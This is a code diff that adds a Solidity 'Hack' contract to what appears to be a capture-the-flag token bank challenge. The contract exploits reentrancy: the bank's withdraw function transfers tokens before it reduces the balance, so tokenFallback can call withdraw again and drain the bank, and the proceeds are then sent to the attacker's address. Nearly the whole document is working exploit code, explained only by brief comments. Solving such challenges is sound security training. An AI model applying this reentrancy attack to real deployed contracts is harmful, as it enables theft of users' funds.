@@ -111,8 +111,43 @@ contract TokenBankChallenge {
 
     function withdraw(uint256 amount) public {
         require(balanceOf[msg.sender] >= amount);
-
         require(token.transfer(msg.sender, amount));
         balanceOf[msg.sender] -= amount;
+    }
+}
+
+contract Hack {
+    TokenBankChallenge tokenBankContract;
+    SimpleERC223Token token;
+    address OWNER;
+
+    constructor(address _tokenBankContract, address _token) public {
+        OWNER = msg.sender;
+        tokenBankContract = TokenBankChallenge(_tokenBankContract);
+        token = SimpleERC223Token(_token);
+    }
+
+    function depositTokensAtBank() public {
+        // deposit tokens to be able to withdraw and trigger the fallback / reentrancy
+        token.transfer(tokenBankContract, 500000 ether);
+    }
+
+    function withdrawStolenFunds() external {
+        token.transfer(OWNER, token.balanceOf(address(this)));
+    }
+
+    function attack() public {
+        // triggers fallback
+        tokenBankContract.withdraw(500000 ether);
+    }
+
+    function tokenFallback(address from, uint256 value, bytes data) external {
+        // Not called when the OWNER/Player transfers tokens to our Hack contract
+        // fallback takes the other half of the funds
+        if (
+            token.balanceOf(tokenBankContract) >= 500000 ether && from != OWNER
+        ) {
+            tokenBankContract.withdraw(500000 ether);
+        }
     }
 }
